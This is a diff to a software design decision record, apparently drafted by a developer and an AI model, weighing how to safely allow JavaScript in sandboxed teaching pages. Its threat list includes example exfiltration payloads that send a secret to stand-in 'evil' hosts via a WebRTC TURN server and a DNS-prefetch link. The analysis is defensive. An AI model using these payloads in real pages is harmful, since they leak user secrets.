@@ -3,7 +3,8 @@
 Date: 2026-11-23
 Status: PROPOSED (Kev to decide). Came from the 1.6 follow-ups (#893). Kev asked "How can it be better?", and one
 answer was interactive teaching pages: a pendulum, a sorting animation, a quiz.
-Deciders: Kev + claude-opus-5-5
+Proposed by: Kev + claude-opus-5-5 (decider: Kev)
+Challenger verdict: no-go on the sketch below; go-with-changes as in the Decision.
 
 ## Context
 
@@ -15,12 +16,12 @@ hostile and wanting to get out.
 
 A challenger pass (2026-11-23) on the obvious sketch ("turn JS on and add `connect-src 'none'`") found:
 
-- **WebRTC is not covered by CSP.** `new RTCPeerConnection({iceServers: [{urls: 'turn:x.evil', username:
+- **WebRTC is not covered by CSP** (the challenger's analysis, unproven here; the canary in decision 3 settles it). `new RTCPeerConnection({iceServers: [{urls: 'turn:x.evil', username:
   SECRET}]})` sends UDP and DNS from WebKit's network process. No CSP directive and no content rule list stops it,
   and the app holds `network.client`. This is the likeliest real exfiltration.
 - **The CSP could be dropped or preempted.** The old splice skipped pages with no `<head>`, or with the policy
-  text in a comment, and ran after a script placed before the head. This was fixed in #896, which proved it with a WebKit
-  canary.
+  text in a comment, and ran after a script placed before the head. Fixed in #896 (merged 2026-11-23), proven with a
+  WebKit inline-script canary.
 - **DNS prefetch / preconnect** (`<link rel=dns-prefetch href=//SECRET.evil>`) has no CSP directive, and we have not
   proven the rule list sees it. This is unknown even with JS off.
 - **Auto-open.** A landed answer opens its page with no click, so injected code would run unprompted.
@@ -37,7 +38,8 @@ The no-JS alternative covers much of the teaching value: CSS keyframes, SVG SMIL
    - a static outer document we write, carrying the CSP (today's, plus `script-src 'unsafe-inline'`; no eval, no wasm),
    - the page inside an escaped `<iframe sandbox="allow-scripts" srcdoc="…">`: an opaque origin with no
      same-origin, popups, top navigation, modals, forms or downloads, and camera, mic and geolocation denied to the frame,
-   - `isLockdownModeEnabled` on the webpage preferences (the only public lever against WebRTC, JIT and WebGL),
+   - `isLockdownModeEnabled` on the webpage preferences (Lockdown restricts WebRTC, JIT and WebGL among others;
+     which of these it switches off for a single WKWebView is for the canary to prove, not this ADR to assert),
    - JS enabled only for the initial navigation (`decidePolicyFor(_:preferences:)`), with navigation limited to
      the initial load, fragments and `about:srcdoc`,
    - a deny-all `WKUIDelegate`, the same content rule list, `baseURL: nil`, and the view torn down when hidden.
